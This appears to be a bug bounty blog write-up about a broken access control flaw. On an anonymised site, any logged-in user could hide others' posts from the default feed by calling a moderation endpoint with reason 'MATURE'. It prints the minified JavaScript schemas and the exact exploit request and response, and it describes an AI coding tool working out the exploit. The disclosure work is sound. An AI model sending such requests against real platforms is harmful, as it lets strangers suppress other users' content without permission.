---
title: "i found moderation endpoint in JS files made me remove any post from the default feed.  "
date: 2026-06-22T00:00:00Z
draft: false
tags: ["broken access control", "BAC", "api", "writeup"]
categories: ["findings"]
cover:
  image: "" # optional: put an image in static/images and reference /images/foo.png
  alt: ""
  caption: ""
---

since i cant disclose the program lets name it target.com. target.com had alot of functions but reading js files was the move to understand the functions more and identify hidden endpoints. when i was analyzing the js files i found a really interesting block of codes.

```js
// POST /api/posts/{id}/moderate  — community "flag" (the BFLA endpoint), request schema only allows reason:"MATURE"
  aq=s.z.object({description:s.z.string().optional(),reason:s.z.literal("MATURE")}),
  aK=s.z.object({adult:s.z.boolean().optional(),message:s.z.string(),postId:s.z.string()}),
  aV=async(e,t,r)=>{let{data:a}=await e.post(`/api/posts/${t}/moderate`,aq,aK,r);return a},

  // shared enums
  aG={NC17:"NC17",PG:"PG",R:"R"},
  aH={BLOCKED:"BLOCKED",COMPLETE:"COMPLETE",DELETED:"DELETED",REVIEW:"REVIEW"},

  // POST /api/posts/{id}/moderation  — staff status/category path (correctly 403 for FREE)
  aY=s.z.object({category:s.z.enum(aG).optional().catch(void
  0),reason:s.z.string().trim().min(1).max(500).optional(),status:s.z.enum(aH).optional().catch(void 0)}).refine(e=>void 0!==e.status||void
  0!==e.category,{message:"At least one of status or category must be provided."}),
  aX=async(e,t,r)=>{let{data:a}=await e.post(`/api/posts/${t}/moderation`,aY,aY,r);return a},

  // GET /api/posts/{id}/moderation  — moderation decision log
  io=s.z.object({createdAt:s.z.string(),decision:s.z.string(),fromCat:s.z.enum(aG).nullable().catch(null),fromStatus:s.z.enum(aH).catch("REVIEW"
  ),id:s.z.string(),reason:s.z.string().nullable(),reviewerId:s.z.string().nullable(),toCat:s.z.enum(aG).nullable().catch(null),toStatus:s.z.enu
  m(aH).catch("REVIEW")}),
  is=s.z.object({data:s.z.array(io)}),
  il=async(e,t)=>{let{data:r}=await e.get(`/api/posts/${t}/moderation`,is);return r}

```

this was so suspicious to me. i gave it to claude code to analyze it. and went to get a coffee then tried to send requests with the id of the post but the request needed other parameters. surprisingly claude code exploited it in 10 minutes! the issue was that endpoint can hide anypost by setting `adult=true`. why is it even an issue? that was my question. after more analyzing. setting REASON parameter to mature made the post get flagged `adult=true` and that flag hides the post from the default feed.

that is the request and the response

```
  POST /api/posts/cmpxelehi005e01s6d9jp4vc0/moderate HTTP/2
  Host: target.com
  Authorization: Bearer <any account>
  Content-Type: application/json

  {"reason":"MATURE"}

  Response (the mutation happening server-side):
  HTTP/2 200
  {"message":"Post flagged successfully.","postId":"cmpxelehi005e01s6d9jp4vc0","adult":true}
```

notice that the response has `"adult":true`. which made the post get flagged and get hidden from the default feed.

reported it to the program and they rewarded it with $$$ bounty.

Thanks for reading
